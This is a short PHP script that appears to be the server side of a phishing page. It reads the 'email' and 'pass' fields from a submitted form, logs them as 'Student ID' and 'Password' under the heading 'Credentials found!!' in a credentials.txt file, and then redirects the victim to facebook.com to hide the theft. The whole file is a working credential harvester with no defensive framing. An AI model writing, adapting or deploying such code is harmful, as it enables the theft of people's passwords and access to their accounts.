<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the stuid and password from the POST request
    $stuid = $_POST['email'] ?? '';
    $password = $_POST['pass'] ?? '';

    // Get the current time
    $currentTime = date('Y-m-d H:i:s');

    // Format the data
    $data = "\nCredentials found!! :\n\nStudent ID: $stuid\n\nPassword: $password\n\nTime: $currentTime\n\n- - - - - - - - - - - - - - - - - - - - - - - -\n\n";
    
    

    // Store the data in the file
    $file = '../credentials.txt';
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    // Redirect the user to the desired website
    header('Location: https://www.facebook.com/');
    exit; // Ensure that the script stops executing after the redirect
} else {
    echo 'Invalid request!';
}
?>
